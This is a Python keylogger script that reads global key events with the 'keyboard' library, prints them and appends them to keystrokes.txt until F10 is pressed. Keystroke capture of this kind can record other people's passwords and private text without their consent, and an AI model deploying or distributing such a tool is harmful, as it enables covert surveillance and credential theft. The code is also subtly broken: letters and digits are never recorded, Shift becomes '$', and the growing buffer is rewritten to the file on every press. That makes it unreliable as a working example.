import keyboard
import time

def save_keystrokes_to_file(keystrokes):
    with open('keystrokes.txt', 'a') as file:
        file.write(keystrokes)

def is_valid_key(event):
    valid_keys = (
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
        'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
        'u', 'v', 'w', 'x', 'y', 'z',
        '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
        'space', 'minus', 'equal', 'bracketleft', 'bracketright',
        'backslash', 'semicolon', 'apostrophe', 'grave',
        'comma', 'period', 'slash', 'at', 'enter', 'shift', 'caps lock',
        'exclam', 'at', 'numbersign', 'dollar', 'percent', 'asciicircum', 'ampersand',
        'asterisk', 'parenleft', 'parenright', 'underscore', 'plus', 'minus', 'equal',
        'asciitilde', 'backquote', 'braceleft', 'braceright', 'bar', 'bracketleft',
        'bracketright', 'backslash', 'quotedbl', 'colon', 'semicolon', 'apostrophe',
        'question', 'slash', 'greater', 'less', 'comma'
    )
    return event.name in valid_keys

def main():
    print(" ")
    keystrokes = ""
    stop_key_combination = {'f10'}  # Key combination to stop capturing
    
    while True:
        event = keyboard.read_event()
        
        if event.event_type == keyboard.KEY_DOWN and is_valid_key(event):
            if all(k in keyboard._pressed_events for k in stop_key_combination):
                print("Stopping keystroke capture.")
                break
            
            if event.name == 'space':
                keystrokes += ' '  # Replace 'space' with a space character
            elif event.name == 'minus':
                keystrokes += '-'
            elif event.name == 'equal':
                keystrokes += '='
            elif event.name == 'bracketleft':
                keystrokes += '['
            elif event.name == 'bracketright':
                keystrokes += ']'
            elif event.name == 'backslash':
                keystrokes += '\\'
            elif event.name == 'semicolon':
                keystrokes += ';'
            elif event.name == 'apostrophe':
                keystrokes += "'"
            elif event.name == 'grave':
                keystrokes += '`'
            elif event.name == 'comma':
                keystrokes += ','
            elif event.name == 'period':
                keystrokes += '.'
            elif event.name == 'slash':
                keystrokes += '/'
            elif event.name == 'at':
                keystrokes += '@'
            elif event.name == 'enter':
                keystrokes += '\n'
            elif event.name == 'shift':
                keystrokes += '$'
            elif event.name == 'caps lock':
                keystrokes += '©'
            elif event.name == 'exclam':
                keystrokes += '!'
            elif event.name == 'numbersign':
                keystrokes += '#'
            elif event.name == 'dollar':
                keystrokes += '$'
            elif event.name == 'percent':
                keystrokes += '%'
            elif event.name == 'asciicircum':
                keystrokes += '^'
            elif event.name == 'ampersand':
                keystrokes += '&'
            elif event.name == 'asterisk':
                keystrokes += '*'
            elif event.name == 'parenleft':
                keystrokes += '('
            elif event.name == 'parenright':
                keystrokes += ')'
            elif event.name == 'underscore':
                keystrokes += '_'
            elif event.name == 'plus':
                keystrokes += '+'
            elif event.name == 'asciitilde':
                keystrokes += '~'
            elif event.name == 'backquote':
                keystrokes += '`'
            elif event.name == 'braceleft':
                keystrokes += '{'
            elif event.name == 'braceright':
                keystrokes += '}'
            elif event.name == 'bar':
                keystrokes += '|'
            elif event.name == 'quotedbl':
                keystrokes += '"'
            elif event.name == 'colon':
                keystrokes += ':'
            elif event.name == 'question':
                keystrokes += '?'
            elif event.name == 'greater':
                keystrokes += '>'
            elif event.name == 'less':
                keystrokes += '<'
            elif event.name == 'comma':
                keystrokes += ','
            
            save_keystrokes_to_file(keystrokes)
            print(keystrokes)

        time.sleep(0.00000001)  # Sleep to avoid excessive CPU usage

if __name__ == "__main__":
    main()
